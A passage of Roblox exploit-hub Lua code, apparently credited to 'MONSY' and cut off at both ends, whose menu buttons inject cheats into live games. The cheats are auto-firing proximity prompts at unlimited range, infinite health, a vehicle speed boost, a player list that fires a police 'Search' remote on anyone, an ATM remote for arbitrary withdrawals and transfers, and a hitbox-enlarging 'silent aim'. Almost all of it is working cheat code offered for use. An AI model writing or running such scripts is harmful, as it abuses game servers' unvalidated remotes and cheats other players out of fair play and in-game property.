		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- PICK UP AUTO
local autoPick = false
local pickPrompt = workspace.DeliveryJob.BoxPickingJob.PickupBox.PickupPrompt
pickPrompt.MaxActivationDistance = math.huge

pickUpButton.MouseButton1Click:Connect(function()
	autoPick = not autoPick
	if autoPick then
		pickUpButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)  -- GREEN KAPAG ON
		pickUpButton.Text = "PICK UP ON"
		task.spawn(function()
			while autoPick do
				pcall(fireproximityprompt, pickPrompt)
				task.wait(0.001)
			end
		end)
	else
		pickUpButton.BackgroundColor3 = Color3.new(1, 1, 1)
		pickUpButton.Text = "PICK UP"
	end
end)

-- DROP AUTO
local autoDrop = false
local dropPrompt = workspace.DeliveryJob.BoxPickingJob.Job.Part.ProximityPrompt
dropPrompt.MaxActivationDistance = math.huge

dropButton.MouseButton1Click:Connect(function()
	autoDrop = not autoDrop
	if autoDrop then
		dropButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)    -- GREEN KAPAG ON
		dropButton.Text = "DROP ON"
		task.spawn(function()
			while autoDrop do
				pcall(fireproximityprompt, dropPrompt)
				task.wait(0.001)
			end
		end)
	else
		dropButton.BackgroundColor3 = Color3.new(1, 1, 1)
		dropButton.Text = "DROP"
	end
end)

-- INSTANT PRESS E
instantButton.MouseButton1Click:Connect(function()
	for _, prompt in ipairs(workspace:GetDescendants()) do
		if prompt:IsA("ProximityPrompt") then
			prompt.HoldDuration = 0
		end
	end
	instantButton.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
	task.wait(0.2)
	instantButton.BackgroundColor3 = Color3.new(1, 1, 1)
end)

-- UPDATE MONEY
task.spawn(function()
	repeat task.wait() until player:FindFirstChild("leaderstats")
	local cash = player.leaderstats:FindFirstChild("Cash") or player.leaderstats:FindFirstChild("Money")
	if cash then
		moneyLabel.Text = "$"..cash.Value
		cash.Changed:Connect(function()
			moneyLabel.Text = "$"..cash.Value
		end)
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("UNIVERSAL NO FALL DAMAGE (MONSY)", function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

Humanoid.MaxHealth = math.huge
Humanoid.Health = math.huge

Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)

game:GetService("RunService").Heartbeat:Connect(function()
    if Humanoid.Health < math.huge then
        Humanoid.Health = math.huge
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAR BOOSTER / B TO BOOST / J TO OPEN SETTINGS (MONSY)", function()
	local DEFAULTS = {
    MAX_BOOST_FORCE = 150,
    BOOST_INCREMENT = 3,
    BOOST_INTERVAL = 0.05,
}

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

local boosting = false
local currentSeat = nil
local boostConnection = nil
local boostConfig = table.clone(DEFAULTS)
local settingsVisible = false

local function getVehicleMainPart(seat)
    local model = seat:FindFirstAncestorOfClass("Model")
    if model and model.PrimaryPart then return model.PrimaryPart end
    for _, p in ipairs(model:GetDescendants()) do
        if p:IsA("BasePart") and p.Name:lower():find("chassis") then return p end
    end
    return seat
end

local function startBoost(seat)
    if boosting or not seat then return end
    boosting = true
    local part = getVehicleMainPart(seat)
    if not part then return end

    local trail = Instance.new("ParticleEmitter")
    trail.Texture = "rbxassetid://242830270"
    trail.Color = ColorSequence.new(Color3.new(1, 1, 1))
    trail.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.5), NumberSequenceKeypoint.new(1, 0)})
    trail.Rate = 50
    trail.Speed = NumberRange.new(5, 10)
    trail.Lifetime = NumberRange.new(0.3)
    trail.Transparency = NumberSequence.new(0.2, 1)
    trail.VelocitySpread = 30
    trail.Name = "BoostTrail"
    trail.Parent = part

    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://72642478827550"
    sound.Looped = true
    sound.Volume = 0.4
    sound.Name = "BoostSound"
    sound.Parent = part
    sound:Play()

    boostConnection = RunService.Heartbeat:Connect(function()
        if not boosting then return end
        local speed = part.AssemblyLinearVelocity.Magnitude
        local label = player.PlayerGui:FindFirstChild("BoostGui") and player.PlayerGui.BoostGui:FindFirstChild("SpeedLabel")
        if label then
            label.Text = "Speed: " .. math.floor(speed + 0.5)
            label.Visible = true
        end

        local currentVelocity = part.AssemblyLinearVelocity
        local forwardDir = seat.CFrame.LookVector
        local forwardSpeed = currentVelocity:Dot(forwardDir)
        local additionalSpeed = math.min(boostConfig.BOOST_INCREMENT, boostConfig.MAX_BOOST_FORCE - forwardSpeed)
        local newVelocity = currentVelocity + (forwardDir * additionalSpeed)
        part.AssemblyLinearVelocity = newVelocity
    end)
end

local function stopBoost()
    boosting = false
    if boostConnection then boostConnection:Disconnect() end
    boostConnection = nil

    if currentSeat then
        local part = getVehicleMainPart(currentSeat)
        if part then
            local trail = part:FindFirstChild("BoostTrail")
            if trail then trail:Destroy() end
            local sound = part:FindFirstChild("BoostSound")
            if sound then sound:Stop() sound:Destroy() end
        end
    end

    local label = player.PlayerGui:FindFirstChild("BoostGui") and player.PlayerGui.BoostGui:FindFirstChild("SpeedLabel")
    if label then label.Visible = false end
end

local function createSlider(name, min, max, default, onChanged)
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, -16, 0, 38)
    container.BackgroundTransparency = 1

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.5, 0)
    label.BackgroundTransparency = 1
    label.Text = name .. ": " .. tostring(default)
    label.TextColor3 = Color3.new(0,0,0)
    label.Font = Enum.Font.Gotham
    label.TextScaled = true
    label.Parent = container

    local slider = Instance.new("TextButton")
    slider.Size = UDim2.new(1, 0, 0.45, 0)
    slider.Position = UDim2.new(0, 0, 0.55, 0)
    slider.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    slider.Text = ""
    slider.AutoButtonColor = false
    slider.Parent = container

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0.6, 0)
    corner.Parent = slider

    local fill = Instance.new("Frame")
    fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    fill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    fill.BorderSizePixel = 0
    fill.Parent = slider

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0.6, 0)
    fillCorner.Parent = fill

    local dragging = false
    local function updateFromInput(input)
        local scale = math.clamp((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X, 0, 1)
        fill.Size = UDim2.new(scale, 0, 1, 0)
        local value = min + (max - min) * scale
        value = tonumber(string.format("%.1f", value))
        label.Text = name .. ": " .. value
        onChanged(value)
    end

    slider.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            updateFromInput(input)
        end
    end)
    slider.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    slider.InputChanged:Connect(function(input)
        if dragging then updateFromInput(input) end
    end)

    return container
end

local function createBoostGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = "BoostGui"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local speedLabel = Instance.new("TextLabel")
    speedLabel.Name = "SpeedLabel"
    speedLabel.Size = UDim2.new(0, 100, 0, 35)
    speedLabel.Position = UDim2.new(0, 20, 0.5, -85)
    speedLabel.BackgroundColor3 = Color3.fromRGB(255,255,255)
    speedLabel.TextColor3 = Color3.new(0,0,0)
    speedLabel.BackgroundTransparency = 0.3
    speedLabel.TextScaled = true
    speedLabel.Font = Enum.Font.GothamBold
    speedLabel.Text = "Speed: 0"
    speedLabel.Visible = false
    speedLabel.Parent = gui
    local lCorner = Instance.new("UICorner", speedLabel)
    lCorner.CornerRadius = UDim.new(0.2, 0)

    local settingsPanel = Instance.new("Frame")
    settingsPanel.Name = "SettingsPanel"
    settingsPanel.Size = UDim2.new(0, 200, 0, 180)
    settingsPanel.Position = UDim2.new(1, -220, 0.5, 0)  -- FIXED RIGHT + CENTERED VERTICALLY
    settingsPanel.BackgroundColor3 = Color3.fromRGB(255,255,255)
    settingsPanel.Visible = false
    settingsPanel.Parent = gui
    local panelCorner = Instance.new("UICorner", settingsPanel)
    panelCorner.CornerRadius = UDim.new(0.1, 0)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 25)
    title.BackgroundTransparency = 1
    title.Text = "MONSY BOOST"
    title.TextColor3 = Color3.new(0,0,0)
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.Parent = settingsPanel

    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Padding = UDim.new(0, 2)
    UIListLayout.FillDirection = Enum.FillDirection.Vertical
    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Parent = settingsPanel

    local resetBtn = Instance.new("TextButton")
    resetBtn.Size = UDim2.new(1, -16, 0, 30)
    resetBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    resetBtn.Text = "Reset"
    resetBtn.TextColor3 = Color3.new(0,0,0)
    resetBtn.TextScaled = true
    resetBtn.Font = Enum.Font.GothamBold
    resetBtn.LayoutOrder = 0
    resetBtn.Parent = settingsPanel
    local rCorner = Instance.new("UICorner", resetBtn)
    rCorner.CornerRadius = UDim.new(0.6, 0)

    local sliders = {
        createSlider("Max Force", 50, 1000, boostConfig.MAX_BOOST_FORCE, function(v) boostConfig.MAX_BOOST_FORCE = v end),
        createSlider("Increment", 1, 20, boostConfig.BOOST_INCREMENT, function(v) boostConfig.BOOST_INCREMENT = v end),
        createSlider("Interval", 0.01, 0.5, boostConfig.BOOST_INTERVAL, function(v) boostConfig.BOOST_INTERVAL = v end),
    }
    for i, slider in ipairs(sliders) do
        slider.LayoutOrder = i + 1
        slider.Parent = settingsPanel
    end

    resetBtn.MouseButton1Click:Connect(function()
        boostConfig = table.clone(DEFAULTS)
        for _, s in ipairs(sliders) do s:Destroy() end
        sliders = {
            createSlider("Max Force", 50, 1000, boostConfig.MAX_BOOST_FORCE, function(v) boostConfig.MAX_BOOST_FORCE = v end),
            createSlider("Increment", 1, 20, boostConfig.BOOST_INCREMENT, function(v) boostConfig.BOOST_INCREMENT = v end),
            createSlider("Interval", 0.01, 0.5, boostConfig.BOOST_INTERVAL, function(v) boostConfig.BOOST_INTERVAL = v end),
        }
        for i, s in ipairs(sliders) do
            s.LayoutOrder = i + 1
            s.Parent = settingsPanel
        end
    end)

    return gui, settingsPanel
end

local function setupBoost(character)
    local playerGui = player:WaitForChild("PlayerGui")
    if playerGui:FindFirstChild("BoostGui") then playerGui.BoostGui:Destroy() end
    local gui, settingsPanel = createBoostGui()

    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.B and currentSeat then
            startBoost(currentSeat)
        elseif input.KeyCode == Enum.KeyCode.J then
            settingsVisible = not settingsVisible
            settingsPanel.Visible = settingsVisible
        end
    end)

    UserInputService.InputEnded:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.B then
            stopBoost()
        end
    end)

    local function monitorSeat(seat)
        if not seat:IsA("VehicleSeat") then return end
        seat:GetPropertyChangedSignal("Occupant"):Connect(function()
            local occupant = seat.Occupant
            if occupant and occupant.Parent == character then
                currentSeat = seat
            elseif currentSeat == seat then
                currentSeat = nil
                stopBoost()
            end
        end)
    end

    for _, s in ipairs(workspace:GetDescendants()) do monitorSeat(s) end
    workspace.DescendantAdded:Connect(monitorSeat)
end

repeat wait() until player.Character
setupBoost(player.Character)
player.CharacterAdded:Connect(function(char)
    repeat wait() until char:FindFirstChild("Humanoid")
    setupBoost(char)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("URBAN CITY REVAMPED CONFISCATE GUI (MONSY) ", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = "PoliceSearchGUI"

local ListFrame = Instance.new("Frame")
ListFrame.Size = UDim2.new(0, 180, 0, 400)
ListFrame.Position = UDim2.new(0, 10, 0.5, -200)
ListFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ListFrame.BorderSizePixel = 0
ListFrame.Parent = ScreenGui

Instance.new("UICorner", ListFrame).CornerRadius = UDim.new(0, 12)

local ListTitle = Instance.new("TextLabel")
ListTitle.Text = "PLAYERS ONLINE"
ListTitle.Font = Enum.Font.GothamBold
ListTitle.TextSize = 16
ListTitle.TextColor3 = Color3.fromRGB(0, 0, 0)
ListTitle.BackgroundTransparency = 1
ListTitle.Size = UDim2.new(1, 0, 0, 35)
ListTitle.Parent = ListFrame

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(1, -10, 1, -45)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.Parent = ListFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 4)
UIListLayout.Parent = ScrollingFrame

local playerButtons = {}

local function addPlayerToList(player)
	if playerButtons[player] then return end

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 35)
	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
	btn.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	btn.TextColor3 = Color3.fromRGB(0, 0, 0)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 14
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Parent = ScrollingFrame

	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

	local padding = Instance.new("UIPadding")
	padding.PaddingLeft = UDim.new(0, 10)
	padding.Parent = btn

	btn.MouseButton1Click:Connect(function()
		if player.Character then
			local args = { player.Character }
			ReplicatedStorage:WaitForChild("Police", 9e9):WaitForChild("Search", 9e9):FireServer(unpack(args))
		end
	end)

	playerButtons[player] = btn
end

local function removePlayerFromList(player)
	if playerButtons[player] then
		playerButtons[player]:Destroy()
		playerButtons[player] = nil
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	addPlayerToList(player)
end

Players.PlayerAdded:Connect(addPlayerToList)
Players.PlayerRemoving:Connect(removePlayerFromList)

local open = true
UIS.InputBegan:Connect(function(key, typing)
	if typing then return end
	if key.KeyCode == Enum.KeyCode.P then
		open = not open
		ListFrame.Visible = open
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("DOMINION CITY BANK GUI (MONSY)", function()
    local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

-- ScreenGui
local FantasyGUI = Instance.new("ScreenGui")
FantasyGUI.Name = "FantasyBank"
FantasyGUI.ResetOnSpawn = false
FantasyGUI.Parent = pgui

-- Main Frame — PURE WHITE
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 360, 0, 300)
MainFrame.Position = UDim2.new(0.5, -180, 0.3, -150)
MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE NA
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Parent = FantasyGUI

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 18)
FrameCorner.Parent = MainFrame

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Color = Color3.new(0, 0, 0)                -- BLACK BORDER
FrameStroke.Thickness = 2
FrameStroke.Parent = MainFrame

-- Title Bar — WHITE
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 45)
TitleBar.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 18)
TitleBarCorner.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "DOMINION CITY"
TitleLabel.Font = Enum.Font.GothamBlack
TitleLabel.TextSize = 24
TitleLabel.TextColor3 = Color3.fromRGB(0,0,0)          -- BLACK TEXT
TitleLabel.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 36, 0, 36)
CloseBtn.Position = UDim2.new(1, -40, 0, 4)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text = "X"
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 20
CloseBtn.TextColor3 = Color3.fromRGB(0,0,0)            -- BLACK
CloseBtn.Parent = TitleBar
CloseBtn.MouseButton1Click:Connect(function()
    FantasyGUI:Destroy()
end)

-- Dragging (same)
local dragging, dragInput, dragStart, startPos
local function updateInput(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then updateInput(input) end
end)

-- Amount
local AmountLabel = Instance.new("TextLabel")
AmountLabel.Size = UDim2.new(0, 100, 0, 30)
AmountLabel.Position = UDim2.new(0, 30, 0, 60)
AmountLabel.BackgroundTransparency = 1
AmountLabel.Text = "Amount:"
AmountLabel.Font = Enum.Font.Gotham
AmountLabel.TextSize = 16
AmountLabel.TextColor3 = Color3.fromRGB(0,0,0)         -- BLACK
AmountLabel.Parent = MainFrame

local AmountBox = Instance.new("TextBox")
AmountBox.Size = UDim2.new(0, 200, 0, 36)
AmountBox.Position = UDim2.new(0, 130, 0, 57)
AmountBox.PlaceholderText = "Amount"
AmountBox.Text = ""
AmountBox.ClearTextOnFocus = true
AmountBox.Font = Enum.Font.Gotham
AmountBox.TextSize = 16
AmountBox.TextColor3 = Color3.fromRGB(0,0,0)           -- BLACK TEXT
AmountBox.BackgroundColor3 = Color3.new(1, 1, 1)       -- WHITE BG
AmountBox.BorderSizePixel = 1
AmountBox.BorderColor3 = Color3.fromRGB(0, 0, 0)       -- BLACK BORDER
AmountBox.Parent = MainFrame

local AmountCorner = Instance.new("UICorner")
AmountCorner.CornerRadius = UDim.new(0, 10)
AmountCorner.Parent = AmountBox

-- USERNAME
local IDLabel = Instance.new("TextLabel")
IDLabel.Size = UDim2.new(0, 100, 0, 30)
IDLabel.Position = UDim2.new(0, 30, 0, 100)
IDLabel.BackgroundTransparency = 1
IDLabel.Text = "USERNAME:"
IDLabel.Font = Enum.Font.Gotham
IDLabel.TextSize = 16
IDLabel.TextColor3 = Color3.fromRGB(0,0,0)             -- BLACK
IDLabel.Parent = MainFrame

local IDBox = Instance.new("TextBox")
IDBox.Size = UDim2.new(0, 200, 0, 36)
IDBox.Position = UDim2.new(0, 130, 0, 97)
IDBox.PlaceholderText = "Username"
IDBox.Text = ""
IDBox.ClearTextOnFocus = true
IDBox.Font = Enum.Font.Gotham
IDBox.TextSize = 16
IDBox.TextColor3 = Color3.fromRGB(0,0,0)               -- BLACK TEXT
IDBox.BackgroundColor3 = Color3.new(1, 1, 1)           -- WHITE BG
IDBox.BorderSizePixel = 1
IDBox.BorderColor3 = Color3.fromRGB(0, 0, 0)           -- BLACK BORDER
IDBox.Parent = MainFrame

local IDCorner = Instance.new("UICorner")
IDCorner.CornerRadius = UDim.new(0, 10)
IDCorner.Parent = IDBox

-- Modes Buttons — WHITE + BLACK TEXT
local modes = {"WITHDRAW", "DEPOSIT", "TRANSFER"}
local currentMode = "WITHDRAW"
local modeButtons = {}

for i, mode in ipairs(modes) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 0, 38)
    btn.Position = UDim2.new(0, 30 + (i-1)*110, 0, 145)
    btn.BackgroundColor3 = Color3.new(1, 1, 1)         -- WHITE
    btn.Text = mode
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 15
    btn.TextColor3 = Color3.fromRGB(0,0,0)             -- BLACK TEXT
    btn.BorderSizePixel = 1
    btn.BorderColor3 = Color3.fromRGB(0, 0, 0)         -- BLACK BORDER
    btn.Parent = MainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = btn

    btn.MouseButton1Click:Connect(function()
        currentMode = mode
        for _, b in ipairs(modeButtons) do
            TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(1, 1, 1)}):Play()
        end
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 200, 200)}):Play()
        IDLabel.Visible = (mode == "TRANSFER")
        IDBox.Visible = (mode == "TRANSFER")
    end)

    table.insert(modeButtons, btn)
    if i == 1 then
        TweenService:Create(btn, TweenInfo.new(0), {BackgroundColor3 = Color3.fromRGB(200, 200, 200)}):Play()
    end
end

-- Execute Button — WHITE + BLACK TEXT
local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Size = UDim2.new(0, 300, 0, 45)
ExecuteBtn.Position = UDim2.new(0.5, -150, 0, 200)
ExecuteBtn.BackgroundColor3 = Color3.new(1, 1, 1)       -- WHITE
ExecuteBtn.Text = "EXECUTE"
ExecuteBtn.Font = Enum.Font.GothamBold
ExecuteBtn.TextSize = 18
ExecuteBtn.TextColor3 = Color3.fromRGB(0,0,0)           -- BLACK TEXT
ExecuteBtn.BorderSizePixel = 2
ExecuteBtn.BorderColor3 = Color3.fromRGB(0, 0, 0)       -- BLACK BORDER
ExecuteBtn.Parent = MainFrame

local ExecCorner = Instance.new("UICorner")
ExecCorner.CornerRadius = UDim.new(0, 12)
ExecCorner.Parent = ExecuteBtn

ExecuteBtn.MouseButton1Click:Connect(function()
    local amount = tonumber(AmountBox.Text) or 0
    local args

    if currentMode == "WITHDRAW" then
        args = { "Withdraw", amount }
    elseif currentMode == "DEPOSIT" then
        args = { "Deposit", amount }
    elseif currentMode == "TRANSFER" then
        local username = tostring(IDBox.Text)
        if username == "" then return end
        args = { "Transfer", amount, username }
    end

    game:GetService("ReplicatedStorage")
        :WaitForChild("Aaron", 9e9)
        :WaitForChild("Shared", 9e9)
        :WaitForChild("Remotes", 9e9)
        :WaitForChild("AtmRemote", 9e9)
        :FireServer(unpack(args))
end)

-- Glow (optional — mas maganda kung grayish white)
local Glow = Instance.new("ImageLabel")
Glow.Size = UDim2.new(1, 60, 1, 60)
Glow.Position = UDim2.new(0, -30, 0, -30)
Glow.BackgroundTransparency = 1
Glow.Image = "rbxassetid://2415002530"
Glow.ImageColor3 = Color3.fromRGB(200, 200, 200)
Glow.ImageTransparency = 0.9
Glow.ScaleType = Enum.ScaleType.Slice
Glow.SliceCenter = Rect.new(100, 100, 100, 100)
Glow.Parent = MainFrame

IDLabel.Visible = false
IDBox.Visible = false
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SILENT AIM BIGHEAD UNIVERSAL (MONSY)", function()
   --// CONFIG
_G.HeadSize = 1
_G.HeadTransparency = 1.0
_G.Disabled = false

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

--// ORIGINAL STORAGE
local Original = {}

local function storeOriginal(player, head)
	if not Original[player] then
		Original[player] = {
			Size = head.Size,
			Transparency = head.Transparency,
			Color = head.BrickColor,
			Material = head.Material,
			Collide = head.CanCollide,
			Massless = head.Massless
		}
	end
end

local function updateHead(head, player)
	if not head or player == LocalPlayer then return end
	storeOriginal(player, head)

	if not _G.Disabled then
		head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
		head.Transparency = _G.HeadTransparency
		head.BrickColor = BrickColor.new("Really red")
		head.Material = Enum.Material.Neon
		head.CanCollide = false
		head.Massless = true
	else
		local data = Original[player]
		if data then
			head.Size = data.Size
			head.Transparency = data.Transparency
			head.BrickColor = data.Color
			head.Material = data.Material
			head.CanCollide = data.Collide
			head.Massless = data.Massless
		end
	end
end

RunService.RenderStepped:Connect(function()
	for _, p in pairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then
			pcall(updateHead, p.Character.Head, p)
		end
	end
end)

Players.PlayerAdded:Connect(function(p)
	p.CharacterAdded:Connect(function(c)
		if c:FindFirstChild("Head") then
			updateHead(c.Head, p)
		end
	end)
end)

--// GUI BASE
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

local function round(obj, r)
	local c = Instance.new("UICorner", obj)
	c.CornerRadius = UDim.new(0, r)
end

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 220, 0, 170)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.new(1,1,1)     -- WHITE GUI
Frame.Active = true
Frame.Draggable = true
round(Frame, 10)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundTransparency = 1
Title.Text = "SILENT AIM (BIGHEAD)"
Title.TextColor3 = Color3.new(0,0,0)           -- BLACK TEXT
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 16

-- SIZE SLIDER
local SliderBack = Instance.new("Frame", Frame)
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.new(0,0,0)
round(SliderBack, 8)

local SliderFill = Instance.new("Frame", SliderBack)
SliderFill.Size = UDim2.new(0, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.new(1,1,1)
round(SliderFill, 8)

local SliderButton = Instance.new("TextButton", SliderBack)
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.new(1,1,1)
SliderButton.Text = ""
round(SliderButton, 10)

local SizeLabel = Instance.new("TextLabel", Frame)
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.45, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.new(0,0,0)
SizeLabel.Text = "Size: " .. _G.HeadSize

-- FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Color = Color3.new(1,1,1)
Circle.Thickness = 2
Circle.NumSides = 100
Circle.Radius = 60
Circle.Filled = false
Circle.Visible = true

RunService.RenderStepped:Connect(function()
	local vp = workspace.CurrentCamera.ViewportSize / 2
	Circle.Position = Vector2.new(vp.X, vp.Y)
end)

-- SLIDER LOGIC (NAYARI NA TALAGA, 100% WORKING)
local draggingSize = false

local function updateSize(percent)
	percent = math.clamp(percent, 0, 1)
	SliderFill.Size = UDim2.new(percent, 0, 1, 0)
	SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)

	_G.HeadSize = 1 + percent * 34
	SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
	Circle.Radius = _G.HeadSize * 5
end

SliderButton.MouseButton1Down:Connect(function()
	draggingSize = true
end)

UIS.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		draggingSize = false
	end
end)

UIS.InputChanged:Connect(function(input)
	if draggingSize and input.UserInputType == Enum.UserInputType.MouseMovement then
		local mousePos = UIS:GetMouseLocation()
		local relativeX = mousePos.X - SliderBack.AbsolutePosition.X
		local percent = math.clamp(relativeX / SliderBack.AbsoluteSize.X, 0, 1)
		updateSize(percent)
	end
end)

-- BIGHEAD TOGGLE
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(0.8, 0, 0, 25)
ToggleButton.Position = UDim2.new(0.1, 0, 0.65, 0)
ToggleButton.BackgroundColor3 = Color3.new(0,0,0)
ToggleButton.TextColor3 = Color3.new(1,1,1)
ToggleButton.Text = "Enabled"
round(ToggleButton, 10)

ToggleButton.MouseButton1Click:Connect(function()
